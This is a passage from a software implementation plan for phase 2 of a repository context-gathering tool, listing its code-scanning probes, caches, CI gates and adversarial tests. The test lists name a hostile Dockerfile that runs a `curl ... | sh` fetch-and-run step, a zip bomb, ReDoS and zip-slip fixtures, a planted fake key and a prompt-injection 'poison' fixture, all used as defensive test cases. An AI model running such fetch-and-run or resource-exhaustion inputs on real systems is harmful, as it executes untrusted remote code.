- [ ] `tests/unit/probes/test_syft_sbom.py` — happy-path SBOM extraction from recorded fixture; cache key invalidates on base-image digest change.
- [ ] `tests/adv/test_hostile_dockerfile_curl.py` — `RUN curl ... | sh` build fails inside `--network=none` sandbox; `build_status: failed, network_egress_attempted: true, confidence: low`; no remote-fetched bytes appear in `repo-context.yaml`.
- [ ] `tests/adv/test_syft_zipbomb.py` — Dockerfile COPYs zip bomb; syft OOM-killed by cgroup; probe `confidence: low`.
- [ ] `tests/unit/probes/test_grype_cve.py` — happy-path CVE match from recorded SBOM input; DB stale → `confidence: medium`; DB missing → `confidence: low`.
- [ ] `tests/adv/test_grype_db_update_blocked.py` — `network="scoped"` allowlist enforced; non-allowlisted host → `ToolNonZeroExit`; probe `confidence: low`.
- [ ] All Step 6 code passes strict mypy.

**Depends on:** Step 1 (`tools.docker`, `tools.syft`, `tools.grype` wrappers; `network="scoped"`) + Step 5 (`DockerfileProbe`).

**Effort:** M — the probes are mechanical; the load-bearing piece is the **sandbox + scoped egress** interaction. Open Question #1 (`bwrap` profile for `docker build`) may surface here; if blocking, `SyftSBOMProbe` falls back to `confidence: low` with structured warning and we file a follow-up.

**Risks specific to this step:** `docker build` opens a unix socket to the host daemon by default — running `dockerd-rootless` or `docker buildx --driver=docker-container` may be required to keep the sandbox honest. If integration fails on macOS or in CI, fall back to recorded-fixture testing for unit + integration coverage and document the limitation. The grype DB update is the only **default** outbound network in Phase 2 — its allowlist (single host) and signed-listing verification are the load-bearing defenses.

## Step 7 — Ship Layer D, Layer E (real + stubs), Layer G; plant per-file findings sub-caches

**Goal:** The remaining 16 probes (9 Layer D + 1 Layer E real + 4 Layer E stubs + 6 Layer G — minus `IndexHealthProbe`/`BuildGraphProbe` already shipped) plus the per-file findings sub-cache infrastructure are on disk. Gitleaks `--redact` invariant is enforced; semgrep per-file cache is exercised.

**Features delivered:**
- `src/codegenie/probes/semgrep.py` per `phase-arch-design.md §"Component design" #13`. Rule packs pinned via `tools/digests.yaml` + `semgrep_rule_packs.yaml`. Pre-warmed `SEMGREP_RULES_CACHE` at install time. Invoked with `--disable-version-check --disable-metrics`. `network="none"`. Per-file findings cache at `.codegenie/cache/semgrep/by-file/<file_blake3>.<rule_pack_version>.msgpack`. Cross-file taint mode opt-in via `--paranoid` (bypasses per-file cache).
- `src/codegenie/probes/gitleaks.py` per `phase-arch-design.md §"Component design" #14`. **`--redact` is mandatory** — wrapper raises `ToolInvariantViolation` if missing. PR-trigger mode (Phase 14 webhook) with `--baseline-path` is opt-in. `OutputSanitizer` Pass 4 is belt-and-suspenders: any `match|secret|finding|raw|context|value` field rewritten to `{content_hash, entropy_band, length}`. History scan (across `git log`) is opt-in (default off).
- `src/codegenie/probes/ast_grep.py` — consumes `tools.treesitter.query` for ast-grep style structural matching.
- `src/codegenie/probes/test_coverage_map.py` — reads `.codegenie/index/scip-index.scip` (per-repo binary; **not** under `cache/`); maps coverage data from `coverage/lcov.info` (Phase 1 parser reused) to SCIP symbols.
- `src/codegenie/probes/invariant_hints.py` + `grep.py` — small Tier-0 probes for invariant hints and BM25 over repo contents (ripgrep default; `tantivy` opt-in via `codegenie[search]` extra).
- 9 Layer D probes: `repo_config.py`, `skills_index.py`, `adr.py`, `convention.py`, `exception.py`, `policy.py`, `repo_notes.py`, `external_docs.py`, `external_docs_index.py` per `phase-arch-design.md §"Component design" #20`. All Tier-0 pure-Python YAML/markdown reads (< 100 ms each). **`RepoNotesProbe` bodies** stored under `.codegenie/context/raw/notes/` at `0600`; **never inlined** into `repo-context.yaml`; scanned by Pass 5 for prompt-injection markers. **`ExternalDocsProbe`** filesystem-only (URL fetcher deferred per ADR-0009). **`ConventionProbe`** dispatches over closed-enum `detect.type` via `match/case`; closed-enum parity lint (Step 2) enforces.
- `OwnershipProbe` real implementation (`ownership.py`) — reads `CODEOWNERS` (GitHub-documented format); pure-Python parser.
- 4 Layer E stubs: `service_topology.py`, `service_contract.py`, `slo.py`, `production_config.py` — `applies()` returns `False` unless config provides a source; one unit test per stub asserts the stub shape.
- Per-file findings sub-cache infrastructure under `src/codegenie/coordinator/`. New module `per_file_cache.py`: read/write msgpack blobs at `(file_content_blake3, rule_pack_version | grammar_version, tool_digest)`. **LRU-by-access-time eviction** with 5 GB cap (Phase 2 default). Per-blob BLAKE3 integrity check on read; mismatched blob deleted; probe re-runs.
- 17 sub-schemas — one per Phase 2 probe — per `phase-arch-design.md §"Data model"`. `additionalProperties: false` at root + every nested block; `schema_version: "v1"`; `x-secret-finding: true` tag on `GitleaksFinding` (forbids `match|raw|value|secret|context`; requires `content_hash + entropy_band + length`).
- New pip deps: `msgpack` (pure-Python or pre-built wheel; CVE-pin via `tools/digests.yaml`), `markdown-it-py` (`ExternalDocsProbe`), `tree-sitter`, `tree-sitter-typescript`, `tree-sitter-javascript`, `gitpython` (Phase 1 dep reused for `IndexHealthProbe`), `networkx` (per `roadmap.md §"Phase 2"`).
- `src/codegenie/probes/__init__.py` — registers all 16 new probes (one import per probe).

**Done criteria:**
- [ ] `tests/unit/probes/test_semgrep.py` — happy path on recorded fixture; per-file cache hit on second run; `--paranoid` bypasses cache; pathological-regex rule → `ToolTimeout` → `confidence: low`.
- [ ] `tests/adv/test_semgrep_redos.py` — pathological regex; timeout fires; sandbox kills; `confidence: low`.
- [ ] `tests/adv/test_malformed_semgrep_output.py` — invalid JSON stdout; `ToolOutputMalformed` raised.
- [ ] `tests/unit/probes/test_gitleaks.py` — `--redact` enforced; `--redact` missing → `ToolInvariantViolation`.
- [ ] `tests/adv/test_gitleaks_redaction_invariant.py` — planted secret `AKIAFAKE0000000000` in fixture; assert the bytes appear NOWHERE in `.codegenie/`.
- [ ] `tests/unit/probes/test_repo_notes.py` + `tests/adv/test_repo_note_prompt_injection.py` — body under `raw/notes/<file>.md` at `0600`; body NOT inlined; Pass 5 emits `prompt_injection_marker_count ≥ 1` on poison fixture.
- [ ] `tests/unit/probes/test_external_docs.py` — filesystem-only; URL not fetched; `tests/adv/test_external_doc_zip_slip.py` refuses path escape; `tests/adv/test_huge_external_doc.py` 200 MB fixture → size cap.
- [ ] `tests/unit/probes/test_convention_dispatch.py` — one test per `detect.type` enum value; closed-enum-lint test asserts `match/case` ↔ schema parity (already a Step 2 lint; tested here at probe level).
- [ ] `tests/unit/probes/test_ownership.py` — CODEOWNERS parsing on synthetic fixtures.
- [ ] `tests/unit/probes/test_e_stubs.py` — each of the 4 E-stub probes asserts the stub shape (one test per stub).
- [ ] `tests/unit/coordinator/test_per_file_cache.py` — LRU eviction at 5 GB cap; BLAKE3 integrity catches; mismatching blob deleted; probe re-runs.
- [ ] `tests/adv/test_concurrent_cache_poisoning.py` — two gathers writing conflicting blobs; BLAKE3 catches; probe re-runs.
- [ ] Sub-schema `x-secret-finding: true` enforced: synthetic finding with `match` field → `SchemaValidationError`.
- [ ] All Step 7 code passes strict mypy.

**Depends on:** Steps 1–6. The dependency on Step 4 is for `test_coverage_map` (reads SCIP); on Step 5 for `RuntimeTraceProbe` registered (the `requires`-set check at registration); on Step 6 for `IndexHealthProbe.semgrep.confidence` to be populated end-to-end.

**Effort:** L — 16 new probes in one step. The Layer D probes are individually small (< 80 LOC each) and structurally similar (pure-Python YAML/markdown reads). Semgrep + gitleaks + the per-file findings cache are the load-bearing pieces.

**Risks specific to this step:** Step 7 PR will balloon. **Split early if exceeding 1,500 LOC into Step 7a (Layer G — semgrep + gitleaks + ast_grep + test_coverage_map + invariant_hints + grep + per-file findings cache) and Step 7b (Layer D 9 probes + Layer E real + 4 stubs).** The `--redact` invariant on gitleaks is critical — the wrapper-level enforcement is the first line; Pass 4 sanitizer is belt-and-suspenders; the adversarial test pins the end-to-end invariant. The per-file findings cache LRU eviction at 5 GB cap is sized for Phase 2; Phase 14 will tune. The `RepoNotesProbe` `0600` permission is platform-sensitive — on macOS, `os.chmod(path, 0o600)` is straightforward; on Windows the test must be skipped (we don't claim Windows support).

## Step 8 — Adversarial corpus + integration end-to-end + seeded-staleness + goldens + CI gates + Phase 3 handoff

**Goal:** The ≥ 40 adversarial fixtures, the 7 integration tests, the per-probe goldens, the bench canaries, and the two new CI jobs are green. The three seeded-staleness fixtures fire on their specific domains. The roadmap Phase 2 exit criteria are demonstrably green.

**Features delivered:**
- Phase 2 adversarial fixtures + tests per `phase-arch-design.md §"Testing strategy" → "Adversarial tests"` (those not already landed in Steps 3–7). At minimum the 17 enumerated in the architecture plus ≥ 23 more covering: tsconfig deep `extends` cycle, hostile Convention catalog YAML, malformed CVE JSON, oversized SBOM, BLAKE3 collision attempt on cache key, hostile YAML in SKILL.md (`test_skill_yaml_injection.py`), audit-chain break (`test_audit_chain_break_observability.py`), legacy npm no-`--ignore-scripts` (`test_legacy_npm_no_ignore_scripts_fallback.py`), no-credentials-in-subprocess-env (`test_no_credentials_in_subprocess_env.py`).
- Integration tests:
  - `tests/integration/test_phase2_end_to_end_node.py` — full gather on `node_typescript_with_b_through_g/`; every Phase 2 slice populated except `runtime_trace` (deferred); envelope + all 17 sub-schemas validate; the cross-probe `if/then` rule fires.
  - `tests/integration/test_phase2_cache_hit_no_subprocess_relaunch.py` — gather twice on same commit; assert zero subprocess invocations on second run; all probes `CacheHit`.
  - `tests/integration/test_phase2_real_oss.py` — clone `nestjs/nest` at a pinned SHA; CI setup runs `npm ci --ignore-scripts` outside gather; gather (without `--strict`); assert SCIP produced, semgrep + gitleaks + `BuildGraphProbe` ran, SBOM produced, `IndexHealthProbe` reports `high` across domains. **Roadmap exit criterion #1.**
  - `tests/integration/test_index_health_staleness_seeded.py` — **Roadmap exit criterion #2.** Three seeded fixtures (`stale_scip_repo/`, `stale_sbom_repo/`, `stale_semgrep_rulepack_repo/`); each surfaced as `confidence: low` on its specific domain. **Exceeds roadmap's "at least one" requirement.**
  - `tests/integration/test_strict_flag_fails_on_low_confidence.py` — `--strict` against seeded fixture; exit code 3.
  - `tests/integration/test_buildgraph_static_vs_resolved.py` — pnpm workspace fixture; resolved vs static-only paths; `resolution_status` matches.
  - `tests/integration/test_phase2_external_docs_disabled_by_default.py` — no `external_docs` config; filesystem-only; no URL fetcher launches; no network access by any probe.
- Fixtures: `tests/fixtures/stale_scip_repo/`, `stale_sbom_repo/`, `stale_semgrep_rulepack_repo/`, `node_typescript_with_b_through_g/`, plus the adversarial fixture set under `tests/fixtures/`.
- Per-probe goldens (`tests/golden/<probe>/<fixture>/expected.json`) — **every Phase 2 probe ships ≥ 1 golden.** CI diff fails on drift. `pytest --update-goldens` regenerates. The Phase 1 `scripts/regen_golden.py` is extended for the Phase 2 probes.
- Bench tests (advisory):
  - `tests/bench/test_warm_path_phase2.py` — second-run all-cache-hit ratio ≤ 0.05 of first-run (advisory).
  - `tests/bench/test_index_health_budget.py` — B2 wall-clock ≤ 200 ms p99 across 1000 iterations on populated peer-output snapshot. **25%-regression gate** on PRs touching `index_health.py` or coordinator.
  - `tests/bench/test_scip_full_reindex.py` — SCIP full re-index ≤ 30 s on 1k-file fixture (advisory).
  - `tests/bench/test_phase2_cold_e2e.py` — cold e2e ≤ 150 s p95 on integration fixture (advisory).
- New CI jobs (already wired via Steps 1–2):
  - `tool_digests_verify` runs `scripts/check_tool_digests.py`.
  - `conventions_catalog_parity` runs `scripts/check_conventions_catalog_parity.py` + `check_skill_schema_versions.py` + `check_conventions_schema_versions.py`.
- Phase 1's six-job CI workflow extended: `test` job runs Phase 2 unit + adversarial + integration suites; `security` job's `pip-audit` + `osv-scanner` closure includes `tree-sitter-typescript`, `tree-sitter-javascript`, `dockerfile`, `markdown-it-py`, `msgpack`, optionally `tantivy`; `fence` job extended to forbid `tantivy` ML deps in defaults.
- Coverage ratchet held at 90/80 with carve-outs from Phase 1's ADR-0005 (Phase 1) unchanged; per-module floors of 85/75 declared in `pyproject.toml` for `probes/syft_sbom.py`, `probes/grype_cve.py`, `probes/scip_index.py` (heavy external-tool wrappers).
- Phase 3 handoff issues filed in the GitHub Project board:
  - Implement Phase 3's first deterministic vuln-remediation recipe.
  - Extend `IndexHealthProbe` with Phase 3-specific consumer rule (`if vuln_remediation.patch_applied present then cve_scan.matches MUST include the targeted CVE`).
  - Decide per-probe sub-schema release-versioning v1→v2 cadence (revisit when first breaking change is proposed).
  - Phase 7 conventions catalog scope decision (Open Question #4: language-scoped vs task-scoped).
  - Phase 14 sub-cache GC policy tuning (Open Question #6).
- `docs/contributing.md` updated with "adding a Phase 2-shape probe" cheat sheet (tool wrapper + sub-schema + `consumes_peer_outputs` opt-in + per-file cache opt-in).
- `docs/phases/02-context-gather-layers-b-g/README.md` updated with the final exit-criteria checklist marked complete.

**Done criteria:**
- [ ] ≥ 40 Phase 2 adversarial tests (≥ 60 total with Phase 1's) all pass in CI; combined p95 wall-clock < 90 s.
- [ ] All 7 integration tests pass on Python 3.11 and 3.12.
- [ ] `test_phase2_real_oss.py` passes against `nestjs/nest` at pinned SHA — **roadmap exit criterion #1.**
- [ ] `test_index_health_staleness_seeded.py` passes against all three seeded fixtures — **roadmap exit criterion #2** (exceeds "at least one").
- [ ] `test_strict_flag_fails_on_low_confidence.py` exits 3 as asserted.
- [ ] Every Phase 2 probe has ≥ 1 golden under `tests/golden/`; CI diff is a hard gate.
- [ ] `test_index_health_budget.py` p99 ≤ 200 ms; 25%-regression gate active on `index_health.py` + coordinator PRs.
- [ ] Both new CI jobs (`tool_digests_verify`, `conventions_catalog_parity`) green on `main`.
- [ ] All six pre-existing CI jobs (`lint`, `typecheck`, `test`, `security`, `docs`, `fence`) + the two new jobs green on `main` on Python 3.11 *and* 3.12 with the full Phase 2 test surface.
- [ ] Coverage gate passes at 90/80 with the documented carve-outs; per-probe coverage reported in the PR body.
- [ ] All five Phase 3 follow-up issues exist on the GitHub Project board with milestones aligned to `roadmap.md §"Phase 3"`.
- [ ] `docs/contributing.md` builds in `mkdocs build --strict` and stays in the curated `nav`.
- [ ] All Step 8 code passes strict mypy.

**Depends on:** Steps 1–7 complete and merged.

**Effort:** L — adversarial fixtures are mechanical individually but ≥ 23 net-new is volume work; integration tests against a real OSS repo (`nestjs/nest`) need CI plumbing (clone at pinned SHA + `npm ci --ignore-scripts` outside the gather). The per-probe golden generation is straightforward but the count (17) adds review surface. The three seeded-staleness fixtures are the load-bearing roadmap exit criterion — getting them to fire deterministically requires careful state seeding (committed SCIP at older commit; committed SBOM at older Dockerfile; rule-pack version pinned to a deprecated version).

**Risks specific to this step:** The `nestjs/nest` real-OSS test is the single most brittle CI piece — pin the SHA hard; commit the pinned `npm ci --ignore-scripts` lockfile; gate the test behind a `[real-oss]` marker so a registry hiccup doesn't block PRs unrelated to Phase 2. Golden non-determinism (Phase 1 risk carried forward): exclude wall-clock + audit timestamps + the rolling chain head from the golden by the regen script. The seeded-staleness fixtures must be reproducible byte-for-byte — commit pre-built `.codegenie/index/scip-index.scip` etc. into the fixture; do **not** regenerate at test time. The advisory bench gates are advisory; if Phase 2 lands a 30% warm-path regression, it must be intentional and ADR-documented.

## Exit-criteria mapping

Every Phase 2 exit criterion from `roadmap.md §"Phase 2"` and every refined goal from `phase-arch-design.md §"Goals"` traces to a step.

| Exit criterion (verbatim or close) | Step(s) |
|---|---|
| Useful `repo-context.yaml` on a real Node.js TS repo with every B/C-except-C4/D/E-stub-or-real/G slice | Steps 3–7 (probes); Step 8 (`test_phase2_real_oss.py`) |
| IndexHealthProbe surfaces ≥ 3 real staleness cases in CI (exceeds "at least one") | Step 3 (probe); Step 8 (`test_index_health_staleness_seeded.py` + 3 fixtures) |
| Probe contract preserved — no edits to `ProbeContext` public field set | Step 1 (`consumes_peer_outputs` is on `Probe`, not `ProbeContext`) |
| Adversarial robustness ≥ 60 hostile fixtures, CI-gating | Steps 3–7 (per-probe adversarial tests); Step 8 (corpus completion + CI gates) |
| Hard caps in every Phase 2 parser, fail-loud | Step 1 (tool wrappers route through Phase 1 parsers); Step 7 (size caps in `ExternalDocsProbe`); Step 8 (adversarial tests pin caps) |
| Per-file findings cache invariant at `(file_blake3, rule_pack_version, grammar_version)` | Step 7 (per-file cache module + tests) |
| Tool-digest pinning via `tools/digests.yaml` + install-time verification | Step 1 (manifest + `tool_digests_verify` CI job) |
| Subprocess sandbox profile (Linux + macOS parity) | Step 1 (`exec.py` extension + `network` param) |
| `--strict` CLI flag exits 3 on B2 low; `--strict-domains` selective | Step 3 (CLI + ADR-0012) |
| Wall-clock targets advisory; B2 200 ms budget + 25%-regression gate | Step 3 (budget mechanism); Step 8 (`test_index_health_budget.py`) |
| No outbound network from `codegenie/` except `grype db update` + base-image pull | Step 1 (`network="none"` default; `fence` CI job); Step 6 (scoped egress paths) |
| Tokens per run = 0 | Step 1 (`fence` CI job continues to assert; extended for `tantivy`) |
| Extension by addition — only four ADR-gated in-place edits | Step 1 (`exec.py`, `output_sanitizer.py`, `coordinator.py`, `probes/__init__.py`) |
| No new architectural infrastructure beyond single Python CLI | Step 1 (no `SandboxStrategy`, no DaemonPool, no MCP shim — all rejected) |
| `consumes_peer_outputs` class attribute + frozen-snapshot positional arg (ADR-0001) | Step 1 (coordinator branch); Step 3 (`IndexHealthProbe` consumer) |
| `RuntimeTraceProbe` class + sub-schema only with `applies()=False` (ADR-0002) | Step 5 (probe + Gap-3 contract) |
| `OutputSanitizer` Pass 4 + Pass 5 (ADR-0006) | Step 1 |
| Rolling BLAKE3 audit chain head + rollover checkpoints (ADR-0011 + Gap 4) | Step 1 |
| `tools/digests.yaml` SHA-256 pin manifest (ADR-0004) | Step 1 |
| Closed-enum conventions catalog + CI parity lint (ADR-0008) | Step 2 |
| `ExternalDocsProbe` filesystem-only in Phase 2 (ADR-0009) | Step 7 |
| `tantivy` opt-in via `codegenie[search]` (ADR-0010) | Step 2 (ADR); Step 7 (`grep.py` ripgrep default) |
| `BuildGraphProbe` `--ignore-scripts` + `resolution_status` (ADR-0007) | Step 3 |
| Schema-evolution policy v1/v2 (Gap 1) + `schema_version: "v1"` on every sub-schema | Step 2 (policy + lints); Steps 3–7 (`schema_version` on each sub-schema) |
| Conventions + skills schema-version CI lints (Gap 2) | Step 2 |
| Per-probe goldens — every Phase 2 probe ships ≥ 1 | Step 8 |
| Layer C dynamic probes (`SyftSBOMProbe`, `GrypeCVEProbe`) with hostile-Dockerfile defense | Step 6 |
| Per-file findings sub-cache LRU 5 GB cap | Step 7 |
| Two new CI jobs (`tool_digests_verify`, `conventions_catalog_parity`) | Step 1 (digests); Step 2 (parity); Step 8 (wired into workflow) |
| Phase 3 handoff issues filed | Step 8 |

No exit criterion is unmapped.

## Implementation-level risks

Distinct from the design-level risks in `phase-arch-design.md`. These are about *the work*.

1. **Step 1 is overloaded.** Tool wrappers + sandbox extension + sanitizer Pass 4/5 + coordinator branch + audit chain rotation + ABC edit + digest manifest + six ADRs all land in one step. **Signal:** Step 1 PR exceeds 1,800 LOC. **What to do:** split into Step 1a (sandbox + `exec.py` + `tools/` wrappers + digests + ADR-0003/0004/0005) and Step 1b (sanitizer Pass 4/5 + audit chain + coordinator branch + ABC edit + ADR-0001/0006/0011). Steps 2–8 unchanged by the split.

2. **Step 7 is the second-largest overload.** 16 new probes + per-file findings cache infrastructure in one step. **Signal:** Step 7 PR exceeds 1,500 LOC. **What to do:** split into Step 7a (Layer G — semgrep + gitleaks + 4 other G probes + per-file findings cache module) and Step 7b (Layer D 9 probes + Layer E real + 4 stubs). Step 8 unchanged.

3. **The `consumes_peer_outputs` ABC addition is the only Phase-0 contract amendment in Phase 2.** **Signal:** a later contributor proposes adding a second class attribute "while we're amending it." **What to do:** encode the allowed-attribute list inside the snapshot regeneration script, not just in the snapshot output. Route `Probe.base.py` to `CODEOWNERS` so any change requires designated review. ADR-0001 explicitly says "no further ABC extensions in Phase 2."

4. **The `--ignore-scripts` invariant is wrapper-enforced, not probe-enforced.** **Signal:** a future probe author writes `tools.pnpm.run(..., flags=["list", "-r"])` (without `--ignore-scripts`) for a non-`BuildGraphProbe` use case. **What to do:** The wrapper's invariant check fires regardless of caller; document in `tools/__init__.py`. The adversarial test `test_buildgraph_postinstall_blocked.py` pins the end-to-end invariant; add a unit-level wrapper-invariant test (`tests/unit/tools/test_pnpm_invariant.py`) so the regression surfaces before integration.

5. **`gitleaks --redact` enforcement is two-layered.** **Signal:** wrapper-level enforcement is bypassed (e.g., a custom flag set inadvertently). **What to do:** Pass 4 sanitizer is belt-and-suspenders — but the `x-secret-finding: true` schema tag is the **third** layer (fails envelope validation). All three layers must be active; `tests/adv/test_gitleaks_redaction_invariant.py` exercises end-to-end.

6. **`nestjs/nest` pinned SHA can drift.** **Signal:** the real-OSS integration test fails because the upstream repo moved. **What to do:** pin the SHA in `tests/integration/test_phase2_real_oss.py` as a top-level constant; commit the matching `npm ci --ignore-scripts` lockfile snapshot under `tests/fixtures/nestjs_nest_pinned/`. SHA bumps require a deliberate PR step.

7. **The three seeded-staleness fixtures must be reproducible byte-for-byte.** **Signal:** `test_index_health_staleness_seeded.py` flakes in CI. **What to do:** commit pre-built `.codegenie/index/scip-index.scip` (for `stale_scip_repo`), the prior SBOM JSON (for `stale_sbom_repo`), and the pinned-deprecated rule-pack version (for `stale_semgrep_rulepack_repo`) directly into the fixture. Do **not** regenerate at test time.

8. **Golden non-determinism (Phase 1 risk carried forward).** **Signal:** a CI run a day later fails the golden diff. **What to do:** the regen script excludes wall-clock fields, audit timestamps, and the rolling chain head from the golden. Run regen twice locally and verify byte-identical output before opening Step 8's PR.

9. **`docker build` inside `bwrap` may not work out-of-the-box.** **Signal:** Step 6 integration tests fail because Docker's daemon socket is not accessible inside the sandbox. **What to do:** fall back to `docker buildx --driver=docker-container` (rootless); if blocking on macOS, file an Open Question #1 follow-up and ship Phase 2 with macOS marked `confidence: low` on `SyftSBOMProbe`. Linux CI is the supported path.

10. **Coverage ratchet at 90/80 is tight; Phase 2 adds 17 probes.** **Signal:** Step 8 PR fails coverage gate. **What to do:** each of Steps 3–7 runs coverage locally for the probes being added and reports the per-probe number in the PR body. Per-module floors of 85/75 declared in `pyproject.toml` for the three heavy external-tool wrappers (`probes/syft_sbom.py`, `probes/grype_cve.py`, `probes/scip_index.py`) — others meet 90/80 or the per-step PR cannot merge.

## What's next — handoff to Phase 3

After Phase 2 ships, the system materially changes in these ways. Phase 3 (`roadmap.md §"Phase 3"`) is the first end-to-end deterministic transform and picks up here.

- **New artifacts on disk:**
  - `.codegenie/context/repo-context.yaml` now contains every Layer A + Layer B (except `runtime_trace` which is `{status: "deferred_to_phase_5"}`) + Layer C-except-C4 + Layer D + Layer E (one real, four stubs) + Layer G slice — 23 active slices for a Node.js TS repo.
  - `.codegenie/context/raw/<probe>.json` per probe; `raw/notes/<file>.md` at `0600`; `raw/external-docs/<file>.md` at `0600`.
  - `.codegenie/index/scip-index.scip` — per-repo binary; rewritten in place by `SCIPIndexProbe`; **never under `cache/`**.
  - `.codegenie/cache/semgrep/by-file/<blake3>.<rule_pack_version>.msgpack`, `gitleaks/by-file/<blake3>.msgpack`, `tree-sitter/by-file/<blake3>.<grammar_version>.msgpack` — per-file findings sub-caches.
  - `.codegenie/runs/<utc>-<short>.json` with `previous_hash` + `chain_head`; `runs/checkpoints/<rollover_index>.json` per 100-gather rollover.
  - `src/codegenie/catalogs/tools/digests.yaml` (pin manifest); `catalogs/conventions/node.yaml`, `shell_replacements/node.yaml`, `semgrep_rule_packs.yaml`.

- **New contracts ready for Phase 3 consumers:**
  - **`SyftSBOMProbe.slice`** + **`GrypeCVEProbe.slice`** — Phase 3 reads `sbom.packages[].version` and `cve.matches[].fix_versions` to choose the patch target. Stage 3 deterministic-recipe path can't run without this.
  - **`BuildGraphProbe.slice`** — Phase 3 reads `build_graph.resolved_edges` (or `declared_edges` if `resolution_status == "static_only"`) to detect peer-dep conflicts.
  - **`NodeManifestProbe.slice`** (Phase 1) + **`NodeBuildSystemProbe.slice`** (Phase 1) — Phase 3 reads `manifests.native_modules` and `build_system.engines.node` to choose the recipe variant.
  - **`SkillsIndexProbe.slice`** — Phase 3 reads `skills.by_task_and_language[("vuln_remediation", "typescript")]` to find the relevant `vuln-remediation-nodejs-*` Skill manifest.
  - **`IndexHealthProbe.slice`** — Phase 3 reads `index_health.cve.confidence`; if `low`, Phase 3 skips that repo. The cross-probe `if/then` envelope rule guarantees `cve.confidence` is present whenever `cve_scan` is.
  - **`ConventionProbe.slice`** — Phase 3 reads org-specific lint rules; the recipe respects them.
  - **`ExceptionProbe.slice`** — Phase 3 honors `expires`-future exception entries that suppress specific CVE rule-matches.
  - **`schema_version: "v1"`** on every Phase 2 sub-schema. Phase 3 adds new top-level slices (`vuln_remediation.*`), never edits Phase 2 sub-schemas. New cross-probe rules use the same envelope `if/then` machinery.

- **New CI gates in place:**
  - `tool_digests_verify` — installed binary SHA-256 matches `tools/digests.yaml`.
  - `conventions_catalog_parity` — `match/case` ↔ `detect.type.enum` parity; every catalog + skill declares `schema_version: "v1"`.
  - Coverage ratchet at 90/80 with 85/75 carve-outs for the three heavy external-tool probes.
  - `fence` job extended: forbids `tantivy` in default deps; continues to forbid LLM SDKs.
  - `security` job's `pip-audit` + `osv-scanner` closure includes `tree-sitter-typescript`, `tree-sitter-javascript`, `dockerfile`, `markdown-it-py`, `msgpack`, optionally `tantivy`.
  - Per-probe golden diff gates active for every Phase 2 probe.
  - 25%-regression bench gate on `IndexHealthProbe` wall-clock.
  - Adversarial corpus ≥ 60 fixtures CI-gating.

- **Implicit assumptions Phase 3 can now make:**
  - Layers B/C-except-C4/D/E-stub-or-real/G are deterministic end-to-end on a Node.js TS repo; same inputs → same 23 slices.
  - `IndexHealthProbe` is the honesty oracle; Phase 3 trusts `confidence: high` and skips on `low` (with `--strict-domains cve` as the CI hammer).
  - Tool-digest pinning means a Phase-3 PR that changes `syft` or `grype` versions invalidates only those probes' caches — the rest stay warm.
  - The `consumes_peer_outputs` contract is in place; Phase 3 can declare new consumer probes that need a frozen peer-output snapshot (e.g., a recipe-selection probe that reads `cve.matches` + `manifests.native_modules` + `skills`) by setting `consumes_peer_outputs = True` and accepting a third positional arg.
  - `OutputSanitizer` Pass 4 + Pass 5 are universal across the pipeline; Phase 3 inherits the secret-redaction + prompt-injection-marker defense without adding any logic.
  - The audit chain advances per gather; Phase 3's recipe-application audit records are appended to the same JSONL with the same rolling BLAKE3 chain head.
  - Per-file findings sub-caches make incremental gather cheap; Phase 3's "re-gather after recipe applied" path hits the per-file cache for unchanged files.
  - `RuntimeTraceProbe` is `{status: "deferred_to_phase_5"}` — Phase 3 must not bind against `runtime_trace.shell_invocations`. Phase 3's distroless-migration consumer is Phase 7, not Phase 3.
  - `ExternalDocsProbe` is filesystem-only; URL fetcher is deferred to v0.2. Phase 3's recipe-doc lookup uses the filesystem index via `ExternalDocsIndexProbe`.
  - The schema-evolution policy (v1/v2) is in place; Phase 3 adds Phase-3 sub-schemas at `schema_version: "v1"` and references the policy doc.
